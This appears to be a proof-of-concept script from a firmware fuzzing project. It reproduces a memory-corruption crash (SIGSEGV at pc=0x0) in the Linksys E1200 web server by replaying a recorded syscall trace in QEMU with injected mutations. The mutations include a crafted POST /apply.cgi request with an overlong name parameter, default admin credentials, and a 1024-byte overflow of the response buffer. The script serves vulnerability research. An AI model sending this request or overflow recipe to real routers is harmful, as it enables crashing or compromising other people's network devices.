#!/usr/bin/env python3
"""
poc_e1200_nbe1200_02.py — PoC for NB-E1200-02

Crash: SIGSEGV (pc=0x0) in Linksys E1200 httpd when processing
POST /apply.cgi?name=<overflowed URL> with oversized response buffer.

Verdict: NETWORK-EXPLOITABLE (verified net_only=CRASH in e1200_post2)

Mechanism:
  - http_extend at idx=136: inflate read retval (256→1024)
  - http_request at idx=136: inject POST URL with 64-char name param
  - replace_buffer_large at idx=147: write 1024 A's into response write buffer
  → corrupts code pointer → SIGSEGV at pc=0x0

Trace: tests/seeds/Linksys_E1200_post.trace (171 syscalls, re-recorded 2026-04-10)
  accept@65(GET), accept@104(POST), read(fd=7)@136(256B), read(fd=7)@138(116B)

Usage:
  cd rr_fuzzing/fuzzing
  python3 ../tests/scripts/fuzzing/poc_e1200_nbe1200_02.py [--max-rounds N] [--gdb]

GDB (with --gdb):
  gdb-multiarch tests/verified_targets/Linksys_E1200/rootfs/usr/sbin/httpd
  (gdb) set architecture mips
  (gdb) target remote :9998
  (gdb) continue
"""
import sys, argparse
from pathlib import Path

ROOT = Path(__file__).resolve().parents[3]
sys.path.insert(0, str(ROOT / 'fuzzing'))

from conductor.qemu_executor import QEMUExecutor
from conductor.conductor_types import FuzzInstruction

ROOTFS     = str(ROOT / 'tests/verified_targets/Linksys_E1200/rootfs')
BUILD      = str(ROOT / '../../build')
BINARY     = f'{ROOTFS}/usr/sbin/httpd'
TRACE      = str(ROOT / 'tests/seeds/Linksys_E1200_post.trace')
FORK_POINT = 104
GDB_PORT   = 9998

# Full campaign recipe from crash_w0_*_c716a47b (e1200_post3, new trace)
# idx=136: POST URL with 64-char name param (URL overflow)
# idx=147: 1024 A's into write buffer (response buffer overflow → pc=0x0)
MUTATIONS = [
    FuzzInstruction(syscall_index=136, cmd=8, arg_index=1,
                    data=b'\x00\x04\x00\x00', offset=0, size=4,
                    mutation_type='http_extend'),
    FuzzInstruction(syscall_index=136, cmd=5, arg_index=1,
                    data=(b'POST /apply.cgi?name=' + b'A' * 64 +
                          b' HTTP/1.1\r\nHost: 127.0.0.1\r\n'
                          b'Authorization: Basic YWRtaW46YWRtaW4=\r\n\r\n'),
                    offset=0, size=154, mutation_type='http_request'),
    FuzzInstruction(syscall_index=140, cmd=8, arg_index=1,
                    data=b'\x04\x00\x00\x00', offset=0, size=4,
                    mutation_type='extend'),
    FuzzInstruction(syscall_index=142, cmd=8, arg_index=1,
                    data=b'\x10\x00\x00\x00', offset=0, size=4,
                    mutation_type='extend'),
    FuzzInstruction(syscall_index=147, cmd=2, arg_index=1,
                    data=b'A' * 1024, offset=0, size=1024,
                    mutation_type='replace_buffer_large'),
    FuzzInstruction(syscall_index=152, cmd=6, arg_index=1,
                    data=b'\x07\x00\x00\x00', offset=0, size=4,
                    mutation_type='bitflip'),
    FuzzInstruction(syscall_index=158, cmd=1, arg_index=255,
                    data=b'\xf3\xff\xff\xff\xff\xff\xff\xff', offset=0, size=8,
                    mutation_type='file_fd_retval'),
    FuzzInstruction(syscall_index=163, cmd=6, arg_index=1,
                    data=b'\x03\x00\x00\x00', offset=0, size=4,
                    mutation_type='bitflip'),
]

# Minimal net-only variant (exclude file_fd_retval at 158)
MUTATIONS_NET_ONLY = [m for m in MUTATIONS
                      if m.mutation_type != 'file_fd_retval']


def run_poc(max_rounds: int, gdb_mode: bool, net_only: bool):
    mutations = MUTATIONS_NET_ONLY if net_only else MUTATIONS
    extra_args = ['-g', str(GDB_PORT)] if gdb_mode else []

    if gdb_mode:
        print(f'\nConnect GDB:')
        print(f'  gdb-multiarch {BINARY}')
        print(f'  (gdb) set architecture mips')
        print(f'  (gdb) target remote :{GDB_PORT}')
        print(f'  (gdb) continue\n')

    executor = QEMUExecutor(
        qemu_path=f'{BUILD}/qemu-mipsel',
        target_binary=BINARY,
        ld_prefix=ROOTFS,
        timeout=15.0,
        extra_qemu_args=extra_args,
    )

    variant = 'net_only' if net_only else 'full'
    print(f'[*] NB-E1200-02 PoC (c716a47b, variant={variant})')
    print(f'[*] Target  : {BINARY}')
    print(f'[*] Trace   : {TRACE}')
    print(f'[*] Mutations: {len(mutations)}')
    print()

    found = False
    for rnd in range(1, max_rounds + 1):
        results = executor.execute_fork(
            trace_file=TRACE,
            fork_point=FORK_POINT,
            mutation_variants=[mutations],
            depth=0,
            iteration_id=rnd,
        )

        if not results:
            if rnd % 50 == 0:
                print(f'  round {rnd:4d}: no result')
            continue

        r = results[0]
        crashed = getattr(r, 'crashed', False)
        sig     = getattr(r, 'signal_number', None)
        pc      = hex(getattr(r, 'pc', 0) or 0)

        if crashed:
            print(f'  round {rnd:4d}: *** CRASH ***  pc={pc}  signal={sig}')
            found = True
            break
        elif rnd % 50 == 0:
            print(f'  round {rnd:4d}: {getattr(r, "status_name", "ok")}')

    executor.stop_persistent_qemu()

    print()
    if found:
        print(f'★ NB-E1200-02 CONFIRMED: pc={pc}  signal={sig}')
        print(f'  Response buffer overflow → code pointer corruption → SIGSEGV pc=0x0')
    else:
        print(f'✗ Not reproduced in {max_rounds} rounds')
    return found


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('--max-rounds', type=int, default=200)
    ap.add_argument('--gdb',       action='store_true')
    ap.add_argument('--net-only',  action='store_true',
                    help='Use net-only mutations (exclude file_fd_retval)')
    args = ap.parse_args()
    run_poc(args.max_rounds, args.gdb, args.net_only)


if __name__ == '__main__':
    main()
